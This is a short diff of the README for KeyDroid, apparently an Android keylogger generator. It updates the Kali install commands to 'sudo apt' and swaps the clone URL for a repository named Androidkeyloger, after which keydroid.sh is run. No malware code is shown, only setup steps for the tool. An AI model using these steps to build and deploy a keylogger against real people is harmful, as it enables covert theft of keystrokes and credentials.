@@ -16,9 +16,9 @@ Usage of KeyDroid for attacking targets without prior mutual consent is illegal.
 ### Installing on Kali Linux:
 ```
 Install dependencies:
-# apt-get update
-# apt-get install openjdk-8-jdk
-# apt-get install gradle
+# sudo apt update
+# sudo apt install openjdk-8-jdk
+# sudo apt install gradle
 
 Use Java8:
 Get Java8 dir with command:
@@ -45,8 +45,8 @@ Go to SDK Manager (Configure -> SDK Manager) and Download:
 Android SDK Build-tools, Android SDK-tools, Android SDK platform-tools, Support Repository
 
 Run script:
-# git clone https://github.com/thelinuxchoice/keydroid
-# cd keydroid/
+# git clone https://github.com/AndroVirus/Androidkeyloger/
+# cd Androidkeyloger/
 # bash keydroid.sh
 
 ```
